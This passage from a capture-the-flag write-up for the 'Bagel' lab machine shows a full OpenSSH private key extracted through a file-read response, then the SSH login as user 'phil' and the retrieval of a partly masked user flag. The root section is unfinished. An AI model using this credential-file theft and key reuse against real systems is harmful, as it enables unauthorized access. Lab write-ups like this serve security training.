    "ReadFile": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----",                       
    "WriteFile": null                                                                                               
  },                                                                                                                
  "WriteOrder": null,                                                                                               
  "ReadOrder": null                                                                                                 
}  
```

## User Flag

By cleaning up the previously found OpenSSH key (e.g., fixing `\n` line breaks and setting sufficent protections on the file through `chmod 600 phil_id_rsa`), one can finally log in as `phil` and retrieve the user flag:

```
└─$ ssh phil@bagel.htb -i phil_id_rsa

[phil@bagel ~]$ whoami
phil
[phil@bagel ~]$ ls 
user.txt
[phil@bagel ~]$ cat user.txt 
4decd*******************6de76e
[phil@bagel ~]$ 
```

## Root Flag

TBD